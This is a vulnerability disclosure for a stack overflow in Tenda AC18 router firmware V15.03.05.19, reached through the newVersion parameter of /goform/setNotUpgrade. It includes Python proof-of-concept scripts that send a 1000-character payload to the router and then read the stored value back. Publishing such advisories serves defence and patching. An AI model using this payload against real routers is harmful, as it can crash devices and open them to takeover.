## Overview

- The device's official website: https://www.tenda.com.cn/product/A18.html
- Firmware download website: https://www.tenda.com.cn/material/show/2683

## Affected version

V15.03.05.19(6318)

## Vulnerability details

In the TendaAC18 Firmware has a stack overflow vulnerability in the `/goform/setNotUpgrade` url. The `Var` variable receives the `newVersion` parameter from a POST request and is stored in the configuration item named`not.notice.version` through the SetValue function.To run to this branch, the value of the `action` parameter needs to be set to 1.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250927_222506.png)

`not.notice.version`  configuration item can  be retrieved through the GetValue function in the `/goform/GetRouterStatus` url.However, neither the GetValue function nor the SetValue function impose any restrictions on the length of variables, which can lead to stack overflows by the `s` variable.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250927_223700.png)

## PoC

Set `not.notice.version`

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/setNotUpgrade"
payload = "a"*1000

data = {"action": 1,"newVersion":payload}
response = requests.post(url, data=data)
print(response.text)
```

Get `not.notice.version`

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/GetRouterStatus"
response = requests.post(url)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250926141817071.png)